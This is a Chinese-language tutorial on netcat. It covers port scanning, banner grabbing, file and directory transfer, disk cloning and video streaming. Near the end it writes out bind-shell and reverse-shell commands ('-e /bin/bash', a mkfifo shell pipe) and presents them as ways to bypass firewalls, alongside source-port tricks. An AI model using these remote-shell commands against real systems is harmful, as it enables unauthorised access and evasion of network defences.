# netcat——网络工具中的瑞士军刀
网络工具中的瑞士军刀——**netcat**，能通过**TCP**和**UDP**在网络中读写数据。

## 端口扫描
端口扫描经常被系统管理员和黑客用来发现一些机器上的开放端口，帮助他们识别系统中的漏洞。

``` sh
$nc -z -v -n 172.31.100.7 21-25
```
可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp。

z：使用ZeroI/O模式，用于扫描。

v：Verbose。

n：不要使用DNS反向查询IP地址的域名。

**该命令会打印21到25所有开放的端口。**

一旦发现开放的端口，可以很容易的使用netcat连接服务抓取他们的banner。例如：

``` sh
$nc -v 172.31.100.7 21
```
netcat命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。

## Chat Server
本例中我们构造一个聊天服务。

**Server端**

```sh
$nc -l 1567
```
netcat命令在1567端口启动了一个tcp服务器，所有的标准输出和输入都会输出到该端口。并且输出和输入都在此shell中展示。

**Client端**

```sh
$nc 172.31.100.7 1567
```

不管在客户端上键入什么都会出现在服务端；同样，不管在服务端键入什么也都会出现在客户端。

## 文件传输
**Server端**

```sh
$nc -l 1567 < file.txt
```

**Client端**

```sh
$nc -n 172.31.100.7 1567 > file.txt
```

创建了一个服务器在A上并且重定向netcat的输入为文件file.txt。任何成功连接到该端口的客户端，netcat都会发送file文件的内容到对方。

在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt。

没有必要创建文件源作为Server，也可以以相反的方法使用。
像下面的例子，发送文件从B到A，但是服务器创建在A上，这次仅需要重定向netcat的输出并且重定向B的输入文件。

**Server端**

```sh
$nc -l 1567 > file.txt
```

**Client端**

```sh
$nc 172.31.100.23 1567 < file.txt
```

## 目录传输

发送一个文件很简单，但是如果要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。

如果你想要通过网络传输一个目录从A到B。

**Server端**

```sh
$tar -cvf – dir_name | nc -l 1567
```

**Client端**

```sh
$nc -n 172.31.100.7 1567 | tar -xvf -
```

在A服务器创建一个tar归档包并且通过**-**在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。

在客户端下载该压缩包，通过netcat管道然后打开文件。

如果想要节省带宽传输压缩包，可以使用bzip2或者其他工具压缩。

Server

```sh
$tar -cvf – dir_name | bzip2 -z | nc -l 1567
```

**Client端口**

```sh
$nc -n 172.31.100.7 1567 | bzip2 -d | tar -xvf -
```

## 加密通过网络发送的数据

如果担心网络上发送数据的安全，可以在发送数据之前用如mcrypt的工具加密。

**服务端**

```sh
$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
```

**客户端**

```sh
$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567
```

以上两个命令会提示需要密码，确保两端使用相同的密码。

这里是使用mcrypt用来加密，使用其它任意加密工具都可以。

## 流视频

虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，仍然有希望做成这件事。

**服务端**

```sh
$cat video.avi | nc -l 1567
```

从一个视频文件中读入并重定向输出到netcat客户端

```sh
$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -
```

从socket中读入数据并重定向到mplayer。

## 克隆一个设备
如果已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而不想再重复配置一遍。
不再需要重复配置安装的过程，只启动另一台机器的一些引导可以克隆你的机器。

克隆Linux PC很简单，假如系统在磁盘/dev/sda上

**Server端**

```sh
$dd if=/dev/sda | nc -l 1567
```

**Client端**

```sh
$nc -n 172.31.100.7 1567 | dd of=/dev/sda
```

**dd**是一个从磁盘读取原始数据的工具，通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。
但是如果已经做过分区并且只需要克隆root分区，可以根据系统root分区的位置，更改sda为sda1，sda2等。

## 打开一个shell
### 假设netcat支持-c -e参数

**Server端**

```sh
$nc -l 1567 -e /bin/bash -i
```

**Client端**

```sh
$nc 172.31.100.7 1567
```

这里创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash

### 假如netcat不支持-c或者-e参数（openbsd netcat）

**Server端**

```sh
$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo
```
创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell。 
2>&1，是用来重定向标准错误输出和标准输出，然后管道到netcat运行的端口1567上。
至此，已经把netcat的输出重定向到fifo文件中。

说明：

* 从网络收到的输入写到fifo文件中。
* cat命令读取fifo文件并且其内容发送给sh命令
* sh命令进程收到输入并把它写回到netcat。
* netcat通过网络发送输出到client

至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待。
而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。

**Client端**

```sh
$nc -n 172.31.100.7 1567
```
会得到一个shell提示符在客户端

### 反向shell

服务端

```sh
$nc -l 1567
```
在客户端，简单地告诉netcat在连接完成后，执行shell。

**客户端**

```sh
$nc 172.31.100.7 1567 -e /bin/bash
```

**反向shell经常被用来绕过防火墙的限制**，如阻止入站连接。
例如，有一个专用IP地址为172.31.100.7，使用代理服务器连接到外部网络。如果想从网络外部访问这台机器如1.2.3.4的shell，那么会用反向外壳用于这一目的。

## 指定源端口

假设防火墙过滤除25端口外的其它所有端口，需要使用**-p**选项指定源端口。

**服务器端**

```sh
$nc -l 1567
```

**客户端**

```sh
$nc 172.31.100.7 1567 -p 25
```
使用1024以内的端口需要root权限。
该命令将在客户端开启25端口用于通讯，否则将使用随机端口。

### 指定源地址

假设机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。
可以在netcat中使用**-s**选项指定ip地址。

**服务器端**

```sh
$nc -u -l 1567 < file.txt
```

**客户端**

```sh
$nc -u 172.31.100.7 1567 -s 172.31.100.5 > file.txt
```
该命令将绑定地址172.31.100.5。


